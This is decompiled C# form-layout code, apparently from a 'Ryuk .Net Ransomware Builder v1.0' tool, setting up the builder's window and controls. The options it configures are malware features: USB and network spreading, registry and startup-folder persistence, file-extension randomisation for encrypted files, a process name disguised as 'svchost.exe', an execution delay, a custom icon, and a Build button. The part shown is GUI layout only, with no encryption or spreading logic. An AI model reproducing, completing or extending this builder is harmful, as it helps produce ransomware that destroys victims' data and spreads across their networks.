		shapedButton3 = new ShapedButton();
		RightBottomPanel_2 = new Panel();
		LeftBottomPanel_1 = new Panel();
		LeftBottomPanel_2 = new Panel();
		RightTopPanel_1 = new Panel();
		RightTopPanel_2 = new Panel();
		LeftTopPanel_1 = new Panel();
		LeftTopPanel_2 = new Panel();
		textBox1 = new TextBox();
		saveFileDialog1 = new SaveFileDialog();
		openFileDialog1 = new OpenFileDialog();
		((Control)TopPanel).SuspendLayout();
		((Control)panel2).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)TopBorderPanel).set_Anchor((AnchorStyles)13);
		((Control)TopBorderPanel).set_BackColor(Color.Black);
		((Control)TopBorderPanel).set_Cursor(Cursors.get_SizeNS());
		((Control)TopBorderPanel).set_Location(new Point(20, 0));
		((Control)TopBorderPanel).set_Name("TopBorderPanel");
		((Control)TopBorderPanel).set_Size(new Size(807, 2));
		((Control)TopBorderPanel).set_TabIndex(0);
		((Control)TopBorderPanel).add_MouseDown(new MouseEventHandler(TopBorderPanel_MouseDown));
		((Control)TopBorderPanel).add_MouseMove(new MouseEventHandler(TopBorderPanel_MouseMove));
		((Control)TopBorderPanel).add_MouseUp(new MouseEventHandler(TopBorderPanel_MouseUp));
		((Control)RightPanel).set_Anchor((AnchorStyles)11);
		((Control)RightPanel).set_BackColor(Color.Black);
		((Control)RightPanel).set_Cursor(Cursors.get_SizeWE());
		((Control)RightPanel).set_Location(new Point(845, 22));
		((Control)RightPanel).set_Name("RightPanel");
		((Control)RightPanel).set_Size(new Size(2, 501));
		((Control)RightPanel).set_TabIndex(1);
		((Control)RightPanel).add_MouseDown(new MouseEventHandler(RightPanel_MouseDown));
		((Control)RightPanel).add_MouseMove(new MouseEventHandler(RightPanel_MouseMove));
		((Control)RightPanel).add_MouseUp(new MouseEventHandler(RightPanel_MouseUp));
		((Control)LeftPanel).set_Anchor((AnchorStyles)7);
		((Control)LeftPanel).set_BackColor(Color.Black);
		((Control)LeftPanel).set_Cursor(Cursors.get_SizeWE());
		((Control)LeftPanel).set_Location(new Point(0, 20));
		((Control)LeftPanel).set_Name("LeftPanel");
		((Control)LeftPanel).set_Size(new Size(2, 501));
		((Control)LeftPanel).set_TabIndex(2);
		((Control)LeftPanel).add_MouseDown(new MouseEventHandler(LeftPanel_MouseDown));
		((Control)LeftPanel).add_MouseMove(new MouseEventHandler(LeftPanel_MouseMove));
		((Control)LeftPanel).add_MouseUp(new MouseEventHandler(LeftPanel_MouseUp));
		((Control)BottomPanel).set_Anchor((AnchorStyles)14);
		((Control)BottomPanel).set_BackColor(Color.Black);
		((Control)BottomPanel).set_Cursor(Cursors.get_SizeNS());
		((Control)BottomPanel).set_Location(new Point(15, 542));
		((Control)BottomPanel).set_Name("BottomPanel");
		((Control)BottomPanel).set_Size(new Size(809, 2));
		((Control)BottomPanel).set_TabIndex(3);
		((Control)BottomPanel).add_MouseDown(new MouseEventHandler(BottomPanel_MouseDown));
		((Control)BottomPanel).add_MouseMove(new MouseEventHandler(BottomPanel_MouseMove));
		((Control)BottomPanel).add_MouseUp(new MouseEventHandler(BottomPanel_MouseUp));
		((Control)TopPanel).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)TopPanel).get_Controls().Add((Control)(object)_MinButton);
		((Control)TopPanel).get_Controls().Add((Control)(object)_MaxButton);
		((Control)TopPanel).get_Controls().Add((Control)(object)WindowTextLabel);
		((Control)TopPanel).get_Controls().Add((Control)(object)_CloseButton);
		((Control)TopPanel).set_Dock((DockStyle)1);
		((Control)TopPanel).set_Location(new Point(0, 0));
		((Control)TopPanel).set_Name("TopPanel");
		((Control)TopPanel).set_Size(new Size(847, 76));
		((Control)TopPanel).set_TabIndex(4);
		((Control)TopPanel).add_MouseDown(new MouseEventHandler(TopPanel_MouseDown));
		((Control)TopPanel).add_MouseMove(new MouseEventHandler(TopPanel_MouseMove));
		((Control)TopPanel).add_MouseUp(new MouseEventHandler(TopPanel_MouseUp));
		((Control)_MinButton).set_Anchor((AnchorStyles)9);
		_MinButton.BZBackColor = Color.FromArgb(30, 30, 30);
		_MinButton.DisplayText = "_";
		((ButtonBase)_MinButton).set_FlatStyle((FlatStyle)0);
		((Control)_MinButton).set_Font(new Font("Microsoft Sans Serif", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)_MinButton).set_ForeColor(Color.White);
		((Control)_MinButton).set_Location(new Point(749, 6));
		_MinButton.MouseClickColor1 = Color.FromArgb(60, 60, 160);
		_MinButton.MouseHoverColor = Color.FromArgb(50, 50, 50);
		((Control)_MinButton).set_Name("_MinButton");
		((Control)_MinButton).set_Size(new Size(31, 24));
		((Control)_MinButton).set_TabIndex(4);
		((Control)_MinButton).set_Text("_");
		_MinButton.TextLocation_X = 6;
		_MinButton.TextLocation_Y = -20;
		((ButtonBase)_MinButton).set_UseVisualStyleBackColor(true);
		((Control)_MinButton).add_Click((EventHandler)_MinButton_Click);
		((Control)_MaxButton).set_Anchor((AnchorStyles)9);
		_MaxButton.BZBackColor = Color.FromArgb(30, 30, 30);
		_MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
		_MaxButton.DisplayText = "_";
		((ButtonBase)_MaxButton).set_FlatStyle((FlatStyle)0);
		((Control)_MaxButton).set_ForeColor(Color.White);
		((Control)_MaxButton).set_Location(new Point(780, 6));
		_MaxButton.MouseClickColor1 = Color.FromArgb(60, 60, 160);
		_MaxButton.MouseHoverColor = Color.FromArgb(50, 50, 50);
		((Control)_MaxButton).set_Name("_MaxButton");
		((Control)_MaxButton).set_Size(new Size(31, 24));
		((Control)_MaxButton).set_TabIndex(2);
		((Control)_MaxButton).set_Text("minMaxButton1");
		_MaxButton.TextLocation_X = 8;
		_MaxButton.TextLocation_Y = 6;
		((ButtonBase)_MaxButton).set_UseVisualStyleBackColor(true);
		((Control)_MaxButton).add_Click((EventHandler)_MaxButton_Click);
		((Control)WindowTextLabel).set_AutoSize(true);
		((Control)WindowTextLabel).set_Font(new Font("Microsoft Sans Serif", 26.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)WindowTextLabel).set_ForeColor(Color.White);
		((Control)WindowTextLabel).set_Location(new Point(8, 22));
		((Control)WindowTextLabel).set_Name("WindowTextLabel");
		((Control)WindowTextLabel).set_Size(new Size(576, 39));
		((Control)WindowTextLabel).set_TabIndex(1);
		((Control)WindowTextLabel).set_Text("Ryuk .Net Ransomware Builder v1.0");
		((Control)WindowTextLabel).add_MouseDown(new MouseEventHandler(WindowTextLabel_MouseDown));
		((Control)WindowTextLabel).add_MouseMove(new MouseEventHandler(WindowTextLabel_MouseMove));
		((Control)WindowTextLabel).add_MouseUp(new MouseEventHandler(WindowTextLabel_MouseUp));
		((Control)_CloseButton).set_Anchor((AnchorStyles)9);
		_CloseButton.BZBackColor = Color.FromArgb(30, 30, 30);
		_CloseButton.DisplayText = "X";
		((ButtonBase)_CloseButton).set_FlatStyle((FlatStyle)0);
		((Control)_CloseButton).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)_CloseButton).set_ForeColor(Color.White);
		((Control)_CloseButton).set_Location(new Point(811, 6));
		_CloseButton.MouseClickColor1 = Color.FromArgb(60, 60, 160);
		_CloseButton.MouseHoverColor = Color.FromArgb(50, 50, 50);
		((Control)_CloseButton).set_Name("_CloseButton");
		((Control)_CloseButton).set_Size(new Size(31, 24));
		((Control)_CloseButton).set_TabIndex(0);
		((Control)_CloseButton).set_Text("X");
		_CloseButton.TextLocation_X = 6;
		_CloseButton.TextLocation_Y = 1;
		((ButtonBase)_CloseButton).set_UseVisualStyleBackColor(true);
		((Control)_CloseButton).add_Click((EventHandler)_CloseButton_Click);
		((Control)RightBottomPanel_1).set_Anchor((AnchorStyles)10);
		((Control)RightBottomPanel_1).set_BackColor(Color.Black);
		((Control)RightBottomPanel_1).set_Cursor(Cursors.get_SizeNWSE());
		((Control)RightBottomPanel_1).set_Location(new Point(827, 542));
		((Control)RightBottomPanel_1).set_Name("RightBottomPanel_1");
		((Control)RightBottomPanel_1).set_Size(new Size(19, 2));
		((Control)RightBottomPanel_1).set_TabIndex(5);
		((Control)RightBottomPanel_1).add_MouseDown(new MouseEventHandler(RightBottomPanel_1_MouseDown));
		((Control)RightBottomPanel_1).add_MouseMove(new MouseEventHandler(RightBottomPanel_1_MouseMove));
		((Control)RightBottomPanel_1).add_MouseUp(new MouseEventHandler(RightBottomPanel_1_MouseUp));
		((Control)panel2).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)panel2).get_Controls().Add((Control)(object)sleepCheckBox);
		((Control)panel2).get_Controls().Add((Control)(object)SleepTextBox);
		((Control)panel2).get_Controls().Add((Control)(object)selectIconLabel);
		((Control)panel2).get_Controls().Add((Control)(object)pictureBox1);
		((Control)panel2).get_Controls().Add((Control)(object)registryStartupcheckBox);
		((Control)panel2).get_Controls().Add((Control)(object)startupcheckBox3);
		((Control)panel2).get_Controls().Add((Control)(object)textBox4);
		((Control)panel2).get_Controls().Add((Control)(object)checkBox2);
		((Control)panel2).get_Controls().Add((Control)(object)spreadNameText);
		((Control)panel2).get_Controls().Add((Control)(object)checkBox1);
		((Control)panel2).get_Controls().Add((Control)(object)textBox2);
		((Control)panel2).get_Controls().Add((Control)(object)usbSpreadCheckBox);
		((Control)panel2).get_Controls().Add((Control)(object)shapedButton4);
		((Control)panel2).get_Controls().Add((Control)(object)shapedButton3);
		((Control)panel2).set_Dock((DockStyle)2);
		((Control)panel2).set_ForeColor(SystemColors.Control);
		((Control)panel2).set_Location(new Point(0, 423));
		((Control)panel2).set_Name("panel2");
		((Control)panel2).set_Size(new Size(847, 121));
		((Control)panel2).set_TabIndex(8);
		((Control)panel2).add_Paint(new PaintEventHandler(panel2_Paint));
		((Control)sleepCheckBox).set_Anchor((AnchorStyles)9);
		((Control)sleepCheckBox).set_AutoSize(true);
		((Control)sleepCheckBox).set_Cursor(Cursors.get_Hand());
		((Control)sleepCheckBox).set_Location(new Point(421, 49));
		((Control)sleepCheckBox).set_Name("sleepCheckBox");
		((Control)sleepCheckBox).set_Size(new Size(91, 17));
		((Control)sleepCheckBox).set_TabIndex(22);
		((Control)sleepCheckBox).set_Text("Delay second");
		((ButtonBase)sleepCheckBox).set_UseVisualStyleBackColor(true);
		sleepCheckBox.add_CheckedChanged((EventHandler)checkBox3_CheckedChanged);
		((Control)SleepTextBox).set_Anchor((AnchorStyles)9);
		((Control)SleepTextBox).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)SleepTextBox).set_Enabled(false);
		((Control)SleepTextBox).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)SleepTextBox).set_ForeColor(SystemColors.Window);
		((Control)SleepTextBox).set_Location(new Point(421, 83));
		((Control)SleepTextBox).set_Name("SleepTextBox");
		((Control)SleepTextBox).set_Size(new Size(91, 22));
		((Control)SleepTextBox).set_TabIndex(21);
		((Control)SleepTextBox).set_Text("10");
		SleepTextBox.set_TextAlign((HorizontalAlignment)2);
		((Control)SleepTextBox).add_KeyPress(new KeyPressEventHandler(SleepTextBox_KeyPress_1));
		((Control)selectIconLabel).set_Anchor((AnchorStyles)9);
		((Control)selectIconLabel).set_AutoSize(true);
		((Control)selectIconLabel).set_Cursor(Cursors.get_Hand());
		((Control)selectIconLabel).set_Location(new Point(571, 70));
		((Control)selectIconLabel).set_Name("selectIconLabel");
		((Control)selectIconLabel).set_Size(new Size(61, 13));
		((Control)selectIconLabel).set_TabIndex(20);
		((Control)selectIconLabel).set_Text("Select Icon");
		((Control)selectIconLabel).add_Click((EventHandler)selectIconLabel_Click);
		((Control)pictureBox1).set_Anchor((AnchorStyles)9);
		pictureBox1.set_BorderStyle((BorderStyle)1);
		((Control)pictureBox1).set_Cursor(Cursors.get_Hand());
		((Control)pictureBox1).set_Location(new Point(556, 44));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(89, 69));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)3);
		pictureBox1.set_TabIndex(18);
		pictureBox1.set_TabStop(false);
		((Control)pictureBox1).add_Click((EventHandler)pictureBox1_Click);
		((Control)registryStartupcheckBox).set_AutoSize(true);
		registryStartupcheckBox.set_Checked(true);
		registryStartupcheckBox.set_CheckState((CheckState)1);
		((Control)registryStartupcheckBox).set_Cursor(Cursors.get_Hand());
		((Control)registryStartupcheckBox).set_Location(new Point(181, 83));
		((Control)registryStartupcheckBox).set_Name("registryStartupcheckBox");
		((Control)registryStartupcheckBox).set_Size(new Size(130, 17));
		((Control)registryStartupcheckBox).set_TabIndex(16);
		((Control)registryStartupcheckBox).set_Text("Add to registry Startup");
		((ButtonBase)registryStartupcheckBox).set_UseVisualStyleBackColor(true);
		((Control)startupcheckBox3).set_AutoSize(true);
		startupcheckBox3.set_Checked(true);
		startupcheckBox3.set_CheckState((CheckState)1);
		((Control)startupcheckBox3).set_Cursor(Cursors.get_Hand());
		((Control)startupcheckBox3).set_Location(new Point(32, 83));
		((Control)startupcheckBox3).set_Name("startupcheckBox3");
		((Control)startupcheckBox3).set_Size(new Size(121, 17));
		((Control)startupcheckBox3).set_TabIndex(15);
		((Control)startupcheckBox3).set_Text("Add to startup folder");
		((ButtonBase)startupcheckBox3).set_UseVisualStyleBackColor(true);
		((Control)textBox4).set_Anchor((AnchorStyles)9);
		((Control)textBox4).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)textBox4).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox4).set_ForeColor(SystemColors.Window);
		((Control)textBox4).set_Location(new Point(528, 10));
		((Control)textBox4).set_Name("textBox4");
		((Control)textBox4).set_Size(new Size(117, 22));
		((Control)textBox4).set_TabIndex(14);
		((Control)textBox4).set_Text("svchost.exe");
		textBox4.set_TextAlign((HorizontalAlignment)2);
		((Control)checkBox2).set_Anchor((AnchorStyles)9);
		((Control)checkBox2).set_AutoSize(true);
		checkBox2.set_Checked(true);
		checkBox2.set_CheckState((CheckState)1);
		((Control)checkBox2).set_Cursor(Cursors.get_Hand());
		((Control)checkBox2).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)checkBox2).set_Location(new Point(421, 14));
		((Control)checkBox2).set_Name("checkBox2");
		((Control)checkBox2).set_Size(new Size(101, 17));
		((Control)checkBox2).set_TabIndex(13);
		((Control)checkBox2).set_Text("Proccess Name");
		((ButtonBase)checkBox2).set_UseVisualStyleBackColor(true);
		checkBox2.add_CheckedChanged((EventHandler)checkBox2_CheckedChanged);
		((Control)spreadNameText).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)spreadNameText).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)spreadNameText).set_ForeColor(SystemColors.Window);
		((Control)spreadNameText).set_Location(new Point(181, 44));
		((Control)spreadNameText).set_Name("spreadNameText");
		((Control)spreadNameText).set_Size(new Size(143, 22));
		((Control)spreadNameText).set_TabIndex(12);
		((Control)spreadNameText).set_Text("surprise");
		spreadNameText.set_TextAlign((HorizontalAlignment)2);
		((Control)checkBox1).set_AutoSize(true);
		checkBox1.set_Checked(true);
		checkBox1.set_CheckState((CheckState)1);
		((Control)checkBox1).set_Cursor(Cursors.get_Hand());
		((Control)checkBox1).set_Location(new Point(32, 10));
		((Control)checkBox1).set_Name("checkBox1");
		((Control)checkBox1).set_Size(new Size(143, 17));
		((Control)checkBox1).set_TabIndex(11);
		((Control)checkBox1).set_Text("Randomize file extension");
		((ButtonBase)checkBox1).set_UseVisualStyleBackColor(true);
		checkBox1.add_CheckedChanged((EventHandler)checkBox1_CheckedChanged);
		((Control)textBox2).set_BackColor(Color.FromArgb(30, 30, 30));
		((Control)textBox2).set_Enabled(false);
		((Control)textBox2).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox2).set_ForeColor(SystemColors.Window);
		((Control)textBox2).set_Location(new Point(181, 8));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(143, 22));
		((Control)textBox2).set_TabIndex(10);
		((Control)textBox2).set_Text("encrypted");
		textBox2.set_TextAlign((HorizontalAlignment)2);
		((Control)usbSpreadCheckBox).set_AutoSize(true);
		usbSpreadCheckBox.set_Checked(true);
		usbSpreadCheckBox.set_CheckState((CheckState)1);
		((Control)usbSpreadCheckBox).set_Cursor(Cursors.get_Hand());
		((Control)usbSpreadCheckBox).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)usbSpreadCheckBox).set_Location(new Point(32, 48));
		((Control)usbSpreadCheckBox).set_Name("usbSpreadCheckBox");
		((Control)usbSpreadCheckBox).set_Size(new Size(142, 17));
		((Control)usbSpreadCheckBox).set_TabIndex(9);
		((Control)usbSpreadCheckBox).set_Text("Usb and network spread");
		((ButtonBase)usbSpreadCheckBox).set_UseVisualStyleBackColor(true);
		usbSpreadCheckBox.add_CheckedChanged((EventHandler)usbSpreadCheckBox_CheckedChanged);
		((Control)shapedButton4).set_Anchor((AnchorStyles)9);
		((Control)shapedButton4).set_BackColor(Color.Transparent);
		shapedButton4.BorderColor = Color.Transparent;
		shapedButton4.BorderWidth = 2;
		shapedButton4.ButtonShape = ShapedButton.ButtonsShapes.RoundRect;
		shapedButton4.ButtonText = "Build ";
		((Control)shapedButton4).set_Cursor(Cursors.get_Hand());
		shapedButton4.EndColor = Color.FromArgb(30, 30, 30);
		((ButtonBase)shapedButton4).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)shapedButton4).get_FlatAppearance().set_MouseDownBackColor(Color.Transparent);
		((ButtonBase)shapedButton4).get_FlatAppearance().set_MouseOverBackColor(Color.Transparent);
		((ButtonBase)shapedButton4).set_FlatStyle((FlatStyle)0);
		((Control)shapedButton4).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)shapedButton4).set_ForeColor(Color.White);
		shapedButton4.GradientAngle = 90;
		((Control)shapedButton4).set_Location(new Point(691, 58));
		shapedButton4.MouseClickColor1 = Color.Black;
		shapedButton4.MouseClickColor2 = Color.Black;
		shapedButton4.MouseHoverColor1 = Color.FromArgb(80, 80, 80);
		shapedButton4.MouseHoverColor2 = Color.FromArgb(80, 80, 80);
		((Control)shapedButton4).set_Name("shapedButton4");
		shapedButton4.ShowButtontext = true;
		((Control)shapedButton4).set_Size(new Size(136, 55));
		shapedButton4.StartColor = Color.FromArgb(30, 30, 30);
		((Control)shapedButton4).set_TabIndex(8);
		shapedButton4.TextLocation_X = 46;
		shapedButton4.TextLocation_Y = 18;
		shapedButton4.Transparent1 = 250;
		shapedButton4.Transparent2 = 250;
		((ButtonBase)shapedButton4).set_UseVisualStyleBackColor(false);
		((Control)shapedButton4).add_Click((EventHandler)shapedButton4_Click);
		((Control)shapedButton3).set_Anchor((AnchorStyles)9);
		((Control)shapedButton3).set_BackColor(Color.Transparent);
		shapedButton3.BorderColor = Color.Transparent;
		shapedButton3.BorderWidth = 2;
		shapedButton3.ButtonShape = ShapedButton.ButtonsShapes.RoundRect;
		shapedButton3.ButtonText = "About";
		((Control)shapedButton3).set_Cursor(Cursors.get_Hand());
		shapedButton3.EndColor = Color.FromArgb(30, 30, 30);
		((ButtonBase)shapedButton3).get_FlatAppearance().set_BorderSize(0);
		((ButtonBase)shapedButton3).get_FlatAppearance().set_MouseDownBackColor(Color.Transparent);
		((ButtonBase)shapedButton3).get_FlatAppearance().set_MouseOverBackColor(Color.Transparent);
		((ButtonBase)shapedButton3).set_FlatStyle((FlatStyle)0);
		((Control)shapedButton3).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)shapedButton3).set_ForeColor(Color.White);
		shapedButton3.GradientAngle = 90;
		((Control)shapedButton3).set_Location(new Point(691, 3));
		shapedButton3.MouseClickColor1 = Color.Black;
		shapedButton3.MouseClickColor2 = Color.Black;
		shapedButton3.MouseHoverColor1 = Color.FromArgb(80, 80, 80);
		shapedButton3.MouseHoverColor2 = Color.FromArgb(80, 80, 80);
		((Control)shapedButton3).set_Name("shapedButton3");
		shapedButton3.ShowButtontext = true;
		((Control)shapedButton3).set_Size(new Size(136, 55));
		shapedButton3.StartColor = Color.FromArgb(30, 30, 30);
		((Control)shapedButton3).set_TabIndex(7);
		shapedButton3.TextLocation_X = 45;
		shapedButton3.TextLocation_Y = 18;
		shapedButton3.Transparent1 = 250;
		shapedButton3.Transparent2 = 250;
		((ButtonBase)shapedButton3).set_UseVisualStyleBackColor(false);
		((Control)shapedButton3).add_Click((EventHandler)shapedButton3_Click);
		((Control)RightBottomPanel_2).set_Anchor((AnchorStyles)10);
		((Control)RightBottomPanel_2).set_BackColor(Color.Black);
		((Control)RightBottomPanel_2).set_Cursor(Cursors.get_SizeNWSE());
		((Control)RightBottomPanel_2).set_Location(new Point(845, 523));
		((Control)RightBottomPanel_2).set_Name("RightBottomPanel_2");
		((Control)RightBottomPanel_2).set_Size(new Size(2, 19));
		((Control)RightBottomPanel_2).set_TabIndex(9);
		((Control)RightBottomPanel_2).add_MouseDown(new MouseEventHandler(RightBottomPanel_2_MouseDown));
		((Control)RightBottomPanel_2).add_MouseMove(new MouseEventHandler(RightBottomPanel_2_MouseMove));
		((Control)RightBottomPanel_2).add_MouseUp(new MouseEventHandler(RightBottomPanel_2_MouseUp));
		((Control)LeftBottomPanel_1).set_Anchor((AnchorStyles)6);
		((Control)LeftBottomPanel_1).set_BackColor(Color.Black);
		((Control)LeftBottomPanel_1).set_Cursor(Cursors.get_SizeNESW());
		((Control)LeftBottomPanel_1).set_Location(new Point(0, 542));
		((Control)LeftBottomPanel_1).set_Name("LeftBottomPanel_1");
		((Control)LeftBottomPanel_1).set_Size(new Size(15, 2));
		((Control)LeftBottomPanel_1).set_TabIndex(10);
		((Control)LeftBottomPanel_1).add_MouseDown(new MouseEventHandler(LeftBottomPanel_1_MouseDown));
		((Control)LeftBottomPanel_1).add_MouseMove(new MouseEventHandler(LeftBottomPanel_1_MouseMove));
		((Control)LeftBottomPanel_1).add_MouseUp(new MouseEventHandler(LeftBottomPanel_1_MouseUp));
		((Control)LeftBottomPanel_2).set_Anchor((AnchorStyles)6);
		((Control)LeftBottomPanel_2).set_BackColor(Color.Black);
		((Control)LeftBottomPanel_2).set_Cursor(Cursors.get_SizeNESW());
		((Control)LeftBottomPanel_2).set_Location(new Point(0, 524));
		((Control)LeftBottomPanel_2).set_Name("LeftBottomPanel_2");
		((Control)LeftBottomPanel_2).set_Size(new Size(2, 19));
		((Control)LeftBottomPanel_2).set_TabIndex(11);
		((Control)LeftBottomPanel_2).add_MouseDown(new MouseEventHandler(LeftBottomPanel_2_MouseDown));
		((Control)LeftBottomPanel_2).add_MouseMove(new MouseEventHandler(LeftBottomPanel_2_MouseMove));
		((Control)LeftBottomPanel_2).add_MouseUp(new MouseEventHandler(LeftBottomPanel_2_MouseUp));
		((Control)RightTopPanel_1).set_Anchor((AnchorStyles)9);
		((Control)RightTopPanel_1).set_BackColor(Color.Black);
		((Control)RightTopPanel_1).set_Cursor(Cursors.get_SizeNESW());
		((Control)RightTopPanel_1).set_Location(new Point(845, 2));
		((Control)RightTopPanel_1).set_Name("RightTopPanel_1");
		((Control)RightTopPanel_1).set_Size(new Size(2, 20));
		((Control)RightTopPanel_1).set_TabIndex(12);
		((Control)RightTopPanel_1).add_MouseDown(new MouseEventHandler(RightTopPanel_1_MouseDown));
		((Control)RightTopPanel_1).add_MouseMove(new MouseEventHandler(RightTopPanel_1_MouseMove));
		((Control)RightTopPanel_1).add_MouseUp(new MouseEventHandler(RightTopPanel_1_MouseUp));
		((Control)RightTopPanel_2).set_Anchor((AnchorStyles)9);
		((Control)RightTopPanel_2).set_BackColor(Color.Black);
		((Control)RightTopPanel_2).set_Cursor(Cursors.get_SizeNESW());
		((Control)RightTopPanel_2).set_Location(new Point(827, 0));
		((Control)RightTopPanel_2).set_Name("RightTopPanel_2");
		((Control)RightTopPanel_2).set_Size(new Size(20, 2));
		((Control)RightTopPanel_2).set_TabIndex(13);
		((Control)RightTopPanel_2).add_MouseDown(new MouseEventHandler(RightTopPanel_2_MouseDown));
		((Control)RightTopPanel_2).add_MouseMove(new MouseEventHandler(RightTopPanel_2_MouseMove));
		((Control)RightTopPanel_2).add_MouseUp(new MouseEventHandler(RightTopPanel_2_MouseUp));
		((Control)LeftTopPanel_1).set_BackColor(Color.Black);
		((Control)LeftTopPanel_1).set_Cursor(Cursors.get_SizeNWSE());
		((Control)LeftTopPanel_1).set_Location(new Point(0, 0));
		((Control)LeftTopPanel_1).set_Name("LeftTopPanel_1");
		((Control)LeftTopPanel_1).set_Size(new Size(20, 2));
		((Control)LeftTopPanel_1).set_TabIndex(14);
		((Control)LeftTopPanel_1).add_MouseDown(new MouseEventHandler(LeftTopPanel_1_MouseDown));
		((Control)LeftTopPanel_1).add_MouseMove(new MouseEventHandler(LeftTopPanel_1_MouseMove));
		((Control)LeftTopPanel_1).add_MouseUp(new MouseEventHandler(LeftTopPanel_1_MouseUp));
		((Control)LeftTopPanel_2).set_BackColor(Color.Black);
		((Control)LeftTopPanel_2).set_Cursor(Cursors.get_SizeNWSE());
		((Control)LeftTopPanel_2).set_Location(new Point(0, 0));
		((Control)LeftTopPanel_2).set_Name("LeftTopPanel_2");
		((Control)LeftTopPanel_2).set_Size(new Size(2, 20));
		((Control)LeftTopPanel_2).set_TabIndex(15);
		((Control)LeftTopPanel_2).add_MouseDown(new MouseEventHandler(LeftTopPanel_2_MouseDown));
		((Control)LeftTopPanel_2).add_MouseMove(new MouseEventHandler(LeftTopPanel_2_MouseMove));
		((Control)LeftTopPanel_2).add_MouseUp(new MouseEventHandler(LeftTopPanel_2_MouseUp));
		((Control)textBox1).set_Anchor((AnchorStyles)15);
		((Control)textBox1).set_BackColor(Color.FromArgb(30, 30, 30));
		((TextBoxBase)textBox1).set_BorderStyle((BorderStyle)0);
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_ForeColor(SystemColors.Window);
		((Control)textBox1).set_Location(new Point(12, 81));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		textBox1.set_ScrollBars((ScrollBars)2);
		((Control)textBox1).set_Size(new Size(827, 336));
		((Control)textBox1).set_TabIndex(18);
		((Control)textBox1).set_Text(componentResourceManager.GetString("textBox1.Text"));
		((FileDialog)saveFileDialog1).add_FileOk((CancelEventHandler)saveFileDialog1_FileOk);
		((FileDialog)openFileDialog1).set_FileName("openFileDialog1");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((ScrollableControl)this).set_AutoScroll(true);
		((Control)this).set_BackColor(Color.FromArgb(30, 30, 30));
		((Form)this).set_ClientSize(new Size(847, 544));
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)LeftTopPanel_2);
		((Control)this).get_Controls().Add((Control)(object)LeftTopPanel_1);
		((Control)this).get_Controls().Add((Control)(object)RightTopPanel_2);
		((Control)this).get_Controls().Add((Control)(object)RightTopPanel_1);
		((Control)this).get_Controls().Add((Control)(object)LeftBottomPanel_2);
		((Control)this).get_Controls().Add((Control)(object)LeftBottomPanel_1);
		((Control)this).get_Controls().Add((Control)(object)RightBottomPanel_2);
		((Control)this).get_Controls().Add((Control)(object)RightBottomPanel_1);
		((Control)this).get_Controls().Add((Control)(object)BottomPanel);
		((Control)this).get_Controls().Add((Control)(object)LeftPanel);
		((Control)this).get_Controls().Add((Control)(object)RightPanel);
		((Control)this).get_Controls().Add((Control)(object)TopBorderPanel);
		((Control)this).get_Controls().Add((Control)(object)TopPanel);
		((Control)this).get_Controls().Add((Control)(object)panel2);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_MinimumSize(new Size(847, 544));
		((Control)this).set_Name("BlackForm");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Ryuk Ransomware");
		((Form)this).add_Load((EventHandler)BlackForm_Load);
		((Control)TopPanel).ResumeLayout(false);
		((Control)TopPanel).PerformLayout();
		((Control)panel2).ResumeLayout(false);
		((Control)panel2).PerformLayout();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
